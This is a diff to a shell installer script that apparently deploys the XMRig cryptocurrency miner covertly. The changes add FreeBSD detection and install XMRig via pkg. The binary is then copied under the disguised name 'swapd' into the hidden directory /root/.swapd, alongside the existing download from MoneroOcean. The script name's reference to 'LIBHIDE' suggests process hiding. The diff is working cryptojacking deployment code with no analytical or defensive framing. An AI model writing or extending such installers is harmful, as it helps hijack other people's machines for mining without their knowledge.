@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.1"
-readonly BUILD_DATE="2026-03-22 03:55:40 UTC"
+readonly SCRIPT_VERSION="4.2"
+readonly BUILD_DATE="2026-03-22 05:13:45 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -1486,6 +1486,22 @@ else
 fi
 echo "[*] Detected package manager: $PKG_MANAGER"
 
+# ==================== FREEBSD DETECTION ====================
+IS_FREEBSD=false
+if [ "$(uname -s)" = "FreeBSD" ]; then
+    IS_FREEBSD=true
+    echo "=========================================="
+    echo "FREEBSD DETECTED"
+    echo "=========================================="
+    echo "[*] Detected FreeBSD operating system"
+    echo "[*] Will use pkg package manager for XMRig installation"
+    PKG_MANAGER="pkg"
+    PKG_INSTALL="pkg install -y"
+    PKG_UPDATE="pkg update"
+    echo "=========================================="
+    echo ""
+fi
+
 # ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
 # Detect and fix interrupted dpkg/apt operations before installing packages
 
@@ -2396,7 +2412,76 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
 
 elif [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== DOWNLOAD XMRIG ====================
-echo "[*] Downloading XMRig from MoneroOcean..."
+
+# Check if FreeBSD - use pkg instead of downloading
+if [ "$IS_FREEBSD" = true ]; then
+    echo "=========================================="
+    echo "FREEBSD: INSTALLING XMRIG VIA PKG"
+    echo "=========================================="
+    echo "[*] FreeBSD detected - installing XMRig from system repository"
+    echo "[*] Running: pkg update"
+    pkg update
+    
+    # Install file command if not present (needed for binary verification)
+    if ! command -v file >/dev/null 2>&1; then
+        echo "[*] Installing file command..."
+        pkg install -y file
+    fi
+    
+    echo "[*] Running: pkg install -y xmrig"
+    pkg install -y xmrig
+    
+    if [ $? -eq 0 ]; then
+        echo "[✓] XMRig installed successfully via pkg"
+        
+        # Create miner directory
+        mkdir -p /root/.swapd
+        
+        # Copy system XMRig to our location
+        echo "[*] Copying /usr/local/bin/xmrig to /root/.swapd/swapd"
+        if [ -f /usr/local/bin/xmrig ]; then
+            cp /usr/local/bin/xmrig /root/.swapd/swapd
+            chmod +x /root/.swapd/swapd
+            echo "[✓] Binary copied successfully"
+            
+            # Verify the binary
+            if [ -f /root/.swapd/swapd ]; then
+                FILE_OUTPUT=$(file /root/.swapd/swapd 2>&1)
+                echo "[*] File type: $FILE_OUTPUT"
+                
+                if echo "$FILE_OUTPUT" | grep -qE "ELF.*(executable|shared object)"; then
+                    echo "[✓] Binary is a valid ELF executable"
+                    DOWNLOAD_SUCCESS=true
+                else
+                    echo "[!] ERROR: Binary verification failed"
+                    echo "[!] File type was: $FILE_OUTPUT"
+                    exit 1
+                fi
+            else
+                echo "[!] ERROR: Failed to copy binary"
+                exit 1
+            fi
+        else
+            echo "[!] ERROR: /usr/local/bin/xmrig not found after pkg install"
+            exit 1
+        fi
+    else
+        echo "[!] ERROR: pkg install xmrig failed"
+        exit 1
+    fi
+    
+    echo "=========================================="
+    echo ""
+    
+    # Skip the download section below
+    DOWNLOAD_SUCCESS=true
+else
+    # Linux/non-FreeBSD: download from MoneroOcean
+    echo "[*] Downloading XMRig from MoneroOcean..."
+fi
+
+# Only run download section if NOT FreeBSD
+if [ "$IS_FREEBSD" != true ]; then
 
 mkdir -p /root/.swapd
 cd /root/.swapd || {
@@ -2642,6 +2727,7 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     exit 1
 fi
 
+fi  # End of FreeBSD download skip check
 
 fi  # End of MINER_TYPE selection (cpuminer vs xmrig)
 
